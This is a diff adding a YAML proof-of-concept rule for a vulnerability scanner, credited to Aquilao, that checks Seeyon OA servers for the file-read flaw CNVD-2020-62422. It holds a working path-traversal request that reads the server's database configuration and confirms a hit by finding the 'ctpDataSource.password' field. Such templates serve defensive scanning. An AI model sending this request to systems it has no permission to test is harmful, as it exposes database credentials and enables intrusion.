@@ -1,0 +1,11 @@
+name: poc-yaml-seeyon-cnvd-2020-62422-readfile
+rules:
+  - method: GET
+    path: /seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties
+    follow_redirects: false
+    expression: response.status == 200 && response.content_type.icontains("application/x-msdownload") && response.body.bcontains(b"ctpDataSource.password")
+detail:
+  author: Aquilao(https://github.com/Aquilao)
+  info: seeyon readfile(CNVD-2020-62422)
+  links:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2020-62422
